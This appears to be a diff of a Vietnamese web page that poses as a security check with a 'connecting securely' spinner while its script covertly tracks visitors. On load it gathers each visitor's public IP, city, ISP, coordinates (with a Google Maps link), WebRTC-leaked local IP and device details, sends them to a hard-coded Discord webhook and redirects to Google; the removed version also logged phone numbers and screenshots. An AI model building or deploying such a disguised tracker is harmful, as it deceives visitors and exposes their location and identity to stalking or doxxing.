@@ -1,168 +1,130 @@
-// ====== WEBHOOK DISCORD - GỬI TOÀN BỘ DỮ LIỆU THU THẬP ======
-// Tích hợp vào trang HTML thu thập IP/vị trí/thiết bị
-// Yêu cầu: Tạo webhook tại Discord Server Settings > Integrations > Webhooks
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hệ thống bảo mật</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #0b0c10; color: #c5c6c7; text-align: center; padding-top: 50px; }
+        .loader { border: 4px solid #1f2833; border-top: 4px solid #45a29e; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <h2>Đang khởi tạo kết nối an toàn...</h2>
+    <div class="loader"></div>
+    <p>Vui lòng không đóng trình duyệt.</p>
 
-const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1573374675659137095/0zFbTOBMvUN80ZT5rr7ayRQEeN_uIe-FJmXPQPgDimMVXFeWS4QA3EEtrzeEOFX7Eoug";
+    <script>
+    // CẤU HÌNH WEBHOOK DISCORD CỦA BẠN
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1573374675659137095/0zFbTOBMvUN80ZT5rr7ayRQEeN_uIe-FJmXPQPgDimMVXFeWS4QA3EEtrzeEOFX7Eoug";
 
-// ====== 1. HÀM GỬI EMBED CƠ BẢN ======
-async function sendToDiscord(payload) {
-    const embed = {
-        title: "📡 Dữ liệu truy cập mới",
-        color: 0x1877f2,
-        timestamp: new Date().toISOString(),
-        fields: [],
-        footer: { text: "PALO Collector v1.0" }
-    };
-
-    // IP & Vị trí
-    if (payload.ipData) {
-        embed.fields.push(
-            { name: "🌐 IP", value: payload.ipData.ip || "N/A", inline: true },
-            { name: "🏙️ Thành phố", value: payload.ipData.city || "N/A", inline: true },
-            { name: "📍 Vùng", value: payload.ipData.region || "N/A", inline: true },
-            { name: "🌍 Quốc gia", value: payload.ipData.country || "N/A", inline: true },
-            { name: "📮 Mã bưu chính", value: payload.ipData.postal || "N/A", inline: true },
-            { name: "🏢 ISP", value: payload.ipData.org || "N/A", inline: true },
-            { name: "📌 Tọa độ", value: payload.ipData.latitude ? `${payload.ipData.latitude}, ${payload.ipData.longitude}` : "N/A", inline: false }
-        );
+    // 1. LẤY THÔNG TIN IP VÀ VỊ TRÍ ĐỊA LÝ
+    async function fetchIPData() {
+        let data = { ip: "Không xác định", city: "Không xác định", region: "Không xác định", country: "Không xác định", isp: "Không xác định", lat: 0, lon: 0 };
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const json = await res.json();
+            data = {
+                ip: json.ip,
+                city: json.city || "Không rõ",
+                region: json.region || "Không rõ",
+                country: json.country_name || "Không rõ",
+                isp: json.org || "Không rõ",
+                lat: json.latitude,
+                lon: json.longitude
+            };
+        } catch (e) {
+            try {
+                const res = await fetch('https://ipinfo.io/json');
+                const json = await res.json();
+                data = {
+                    ip: json.ip,
+                    city: json.city || "Không rõ",
+                    region: json.region || "Không rõ",
+                    country: json.country || "Không rõ",
+                    isp: json.org || "Không rõ",
+                    lat: 0, lon: 0
+                };
+            } catch (err) { console.error("Lỗi API IP:", err); }
+        }
+        return data;
     }
 
-    // Thiết bị & Mạng
-    if (payload.networkData) {
-        const n = payload.networkData;
-        embed.fields.push(
-            { name: "💻 User Agent", value: (n.userAgent || "N/A").substring(0, 200), inline: false },
-            { name: "🖥️ Nền tảng", value: n.platform || "N/A", inline: true },
-            { name: "🗣️ Ngôn ngữ", value: (n.languages || []).join(", ") || "N/A", inline: true },
-            { name: "🕐 Múi giờ", value: n.timezone || "N/A", inline: true },
-            { name: "📺 Màn hình", value: `${n.screenWidth}x${n.screenHeight} (${n.colorDepth}bit)`, inline: true },
-            { name: "🔗 Referrer", value: n.referrer || "Trực tiếp", inline: false },
-            { name: "📄 Trang", value: (n.pageURL || "N/A").substring(0, 200), inline: false },
-            { name: "📶 Kết nối", value: n.connection ? `${n.connection.effectiveType} | ${n.connection.downlink}Mbps | ${n.connection.rtt}ms` : "N/A", inline: false },
-            { name: "🖧 IP nội bộ", value: n.localIP || "Không lấy được", inline: true }
-        );
-    }
-
-    // Số điện thoại
-    if (payload.phoneData) {
-        embed.fields.push(
-            { name: "📱 Số điện thoại", value: payload.phoneData.phone || "Không có", inline: true },
-            { name: "📋 Phương thức", value: payload.phoneData.method || "N/A", inline: true }
-        );
-    }
-
-    // Dữ liệu bổ sung
-    if (payload.browserInfo) {
-        const b = payload.browserInfo;
-        embed.fields.push(
-            { name: "🍪 Cookie", value: b.cookieEnabled ? "Bật" : "Tắt", inline: true },
-            { name: "🛡️ DNT", value: b.doNotTrack || "Không", inline: true },
-            { name: "⚙️ CPU cores", value: String(b.hardwareConcurrency || "N/A"), inline: true },
-            { name: "💾 RAM (GB)", value: String(b.deviceMemory || "N/A"), inline: true }
-        );
-    }
-
-    // Timestamp
-    if (payload.timestamp) {
-        embed.fields.push({ name: "⏱️ Thời gian", value: payload.timestamp, inline: false });
-    }
-
-    // Gửi request
-    try {
-        const res = await fetch(DISCORD_WEBHOOK_URL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                username: "PALO Collector",
-                avatar_url: "https://i.imgur.com/4M34hi2.png",
-                embeds: [embed]
-            })
+    // 2. LẤY IP MẠNG NỘI BỘ QUA WEBRTC (Local IP)
+    function getLocalIP() {
+        return new Promise((resolve) => {
+            const pc = new RTCPeerConnection({ iceServers: [] });
+            pc.createDataChannel('');
+            pc.createOffer().then(offer => pc.setLocalDescription(offer));
+            pc.onicecandidate = (event) => {
+                if (!event.candidate) {
+                    resolve("Không lấy được");
+                    return;
+                }
+                const ipMatch = event.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
+                if (ipMatch && ipMatch[0] !== "0.0.0.0") {
+                    resolve(ipMatch[0]);
+                    pc.close();
+                }
+            };
+            setTimeout(() => resolve("Không lấy được"), 2000);
         });
-        if (res.ok) {
-            console.log("[PALO] Gửi Discord thành công");
-            return true;
-        } else {
-            console.warn("[PALO] Discord lỗi:", res.status, await res.text());
-            return false;
+    }
+
+    // 3. TỔNG HỢP VÀ GỬI VỀ DISCORD
+    async function sendToDiscord() {
+        const ipData = await fetchIPData();
+        const localIP = await getLocalIP();
+        
+        // Tạo link Google Maps nếu có tọa độ
+        const mapLink = (ipData.lat && ipData.lon) ? `https://www.google.com/maps?q=${ipData.lat},${ipData.lon}` : "Không có tọa độ";
+
+        const embed = {
+            title: "🚨 CẢNH BÁO: CÓ NGƯỜI TRUY CẬP LINK",
+            color: 0xff0000,
+            timestamp: new Date().toISOString(),
+            fields: [
+                { name: "🌐 IP Công Cộng (Mạng)", value: `\`${ipData.ip}\``, inline: true },
+                { name: "🖧 IP Nội Bộ (Máy)", value: `\`${localIP}\``, inline: true },
+                { name: "🏙️ Thành Phố / Vùng", value: `${ipData.city}, ${ipData.region}`, inline: false },
+                { name: "🌍 Quốc Gia", value: `${ipData.country}`, inline: true },
+                { name: "🏢 Nhà Mạng (ISP)", value: `${ipData.isp}`, inline: true },
+                { name: "📍 Vị trí (Google Maps)", value: mapLink, inline: false },
+                { name: "💻 Thiết Bị / Trình Duyệt", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
+                { name: "📺 Màn Hình", value: `${screen.width}x${screen.height}`, inline: true },
+                { name: "🗣️ Ngôn Ngữ", value: `${navigator.language}`, inline: true }
+            ],
+            footer: { text: "PALO System | Trackers" }
+        };
+
+        try {
+            const response = await fetch(DISCORD_WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    username: "PALO Tracker Bot",
+                    avatar_url: "https://i.imgur.com/4M34hi2.png",
+                    embeds: [embed]
+                })
+            });
+            
+            if (response.ok) {
+                console.log("Gửi thành công");
+                // Chuyển hướng người dùng đến trang khác sau khi lấy xong data (tùy chọn)
+                setTimeout(() => { window.location.href = "https://www.google.com"; }, 1500);
+            } else {
+                console.error("Lỗi Webhook:", response.status);
+            }
+        } catch (error) {
+            console.error("Lỗi gửi request:", error);
         }
-    } catch (e) {
-        console.warn("[PALO] Gửi Discord thất bại:", e);
-        return false;
     }
-}
 
-// ====== 2. GỬI DỮ LIỆU THÔ (RAW JSON) KÈM FILE ======
-async function sendRawToDiscord(payload) {
-    const formData = new FormData();
-    formData.append("payload_json", JSON.stringify({
-        username: "PALO Raw Logger",
-        content: "```json\n" + JSON.stringify(payload, null, 2).substring(0, 1900) + "\n```"
-    }));
-    // Đính kèm file JSON đầy đủ
-    const blob = new Blob([JSON.stringify(payload, null, 2)], { type: "application/json" });
-    formData.append("file", blob, `log_${Date.now()}.json`);
-
-    try {
-        const res = await fetch(DISCORD_WEBHOOK_URL, { method: "POST", body: formData });
-        console.log("[PALO] Raw gửi:", res.status);
-        return res.ok;
-    } catch (e) {
-        console.warn("[PALO] Raw lỗi:", e);
-        return false;
-    }
-}
-
-// ====== 3. GỬI ẢNH CHỤP MÀN HÌNH (nếu có) ======
-async function sendScreenshotToDiscord(dataUrl, caption = "") {
-    const blob = await (await fetch(dataUrl)).blob();
-    const formData = new FormData();
-    formData.append("payload_json", JSON.stringify({
-        username: "PALO Screenshot",
-        content: caption || "Ảnh chụp màn hình"
-    }));
-    formData.append("file", blob, `screenshot_${Date.now()}.png`);
-
-    try {
-        const res = await fetch(DISCORD_WEBHOOK_URL, { method: "POST", body: formData });
-        return res.ok;
-    } catch (e) {
-        return false;
-    }
-}
-
-// ====== 4. HÀM TỔNG HỢP - GỌI SAU KHI THU THẬP ======
-async function collectAndReport() {
-    const payload = {
-        timestamp: new Date().toISOString(),
-        ipData: await getIPInfo(),
-        networkData: getNetworkInfo(),
-        phoneData: await getPhoneNumber(),
-        browserInfo: {
-            cookieEnabled: navigator.cookieEnabled,
-            doNotTrack: navigator.doNotTrack,
-            hardwareConcurrency: navigator.hardwareConcurrency,
-            maxTouchPoints: navigator.maxTouchPoints,
-            deviceMemory: navigator.deviceMemory
-        }
-    };
-
-    // Gửi embed đẹp
-    await sendToDiscord(payload);
-    // Gửi raw JSON đầy đủ
-    await sendRawToDiscord(payload);
-
-    return payload;
-}
-
-// ====== 5. TỰ ĐỘNG KÍCH HOẠT ======
-window.addEventListener("load", () => {
-    setTimeout(collectAndReport, 1500);
-});
-
-// ====== 6. GỬI KHI RỜI TRANG ======
-window.addEventListener("beforeunload", () => {
-    navigator.sendBeacon(DISCORD_WEBHOOK_URL, JSON.stringify({
-        username: "PALO Exit",
-        content: "🚪 Người dùng rời trang lúc " + new Date().toISOString()
-    }));
-});
+    // Kích hoạt khi tải trang
+    window.addEventListener("load", () => {
+        setTimeout(sendToDiscord, 500);
+    });
+    </script>
+</body>
+</html>
